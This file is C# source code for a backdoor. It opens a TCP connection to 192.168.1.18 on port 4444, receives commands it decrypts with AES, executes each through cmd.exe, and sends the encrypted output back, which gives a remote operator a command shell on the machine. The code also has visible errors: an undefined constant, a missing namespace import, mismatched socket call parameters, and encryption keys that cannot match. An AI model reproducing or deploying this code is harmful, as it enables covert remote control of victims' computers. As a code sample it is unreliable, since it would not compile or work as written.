using System;
using System.Net.Sockets;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;

public class Backdoor
{
    private const int AF_INET = 2;
    private const int SOCK_STREAM = 1;
    private const int IPPROTO_TCP = 6;
    private const int SIO_RCVALL = 0x98000001;
    private const int IP_HDRINCL = 2;
    [DllImport("ws2_32.dll")]
    public static extern int socket(int af, int type, int protocol);
    [DllImport("ws2_32.dll")]
    public static extern int setsockopt(int s, int level, int optname, ref int optval, int optlen);
    [DllImport("ws2_32.dll")]
    public static extern int connect(int s, ref sockaddr_in name, int namelen);
    [DllImport("ws2_32.dll")]
    public static extern int recv(int s, ref byte buffer, int buflen, int flags);
    [DllImport("ws2_32.dll")]
    public static extern int send(int s, ref byte buffer, int buflen, int flags);
    [StructLayout(LayoutKind.Sequential)]
    private struct sockaddr_in
    {
        public short sin_family;
        public ushort sin_port;
        public uint sin_addr;
        public byte sin_zero;
    }

    public static void Main()
    {
        string ipAddr = "192.168.1.18";
        int port = 4444;
        byte[] buffer = new byte[1024];
        sockaddr_in addr = new sockaddr_in();
        int s;
        int optval;
        int ip;
        int retval;

        // Create socket
        s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        // Set up socket options
        optval = 1;
        setsockopt(s, IPPROTO_TCP, SIO_RCVALL, ref optval, 4);
        optval = 1;
        setsockopt(s, IPPROTO_IP, IP_HDRINCL, ref optval, 4);

        // Connect to server
        ip = BitConverter.ToUInt32(System.Net.IPAddress.Parse(ipAddr).GetAddressBytes(), 0);
        addr.sin_addr = ip;
        addr.sin_family = AF_INET;
        addr.sin_port = (ushort)port;
        retval = connect(s, ref addr, 16);

        // Create a stream for encryption
        AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
        CryptoStream cs = new CryptoStream(new MemoryStream(), aes.CreateEncryptor(), CryptoStreamMode.Write);

        while (true)
        {
            // Receive data
            retval = recv(s, ref buffer, 1024, 0);

            // Decode data
            byte[] decryptedData = Decrypt(buffer, aes.IV);
            string command = Encoding.ASCII.GetString(decryptedData);

            // Execute command
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe");
            psi.Arguments = "/C " + command;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process process = Process.Start(psi);

            StreamReader reader = process.StandardOutput;
            string output = reader.ReadToEnd();
            reader.Close();

            // Encode data
            byte[] encryptedOutput = Encrypt(output, aes.IV);

            // Send data
            retval = send(s, ref encryptedOutput, encryptedOutput.Length, 0);
        }
    }

    public static byte[] Encrypt(string clearText, byte[] iv)
    {
        AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
        byte[] encrypted;

        using (MemoryStream ms = new MemoryStream())
        {
            using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
            {
                byte[] input = Encoding.UTF8.GetBytes(clearText);
                cs.Write(input, 0, input.Length);
                cs.FlushFinalBlock();
                encrypted = ms.ToArray();
            }
        }

        return encrypted;
    }

    public static byte[] Decrypt(byte[] cipherText, byte[] iv)
    {
        AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
        string decrypted;

        using (MemoryStream ms = new MemoryStream(cipherText))
        {
            using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))
            {
                StreamReader reader = new StreamReader(cs);
                decrypted = reader.ReadToEnd();
            }
        }

        return Encoding.UTF8.GetBytes(decrypted);
    }
}
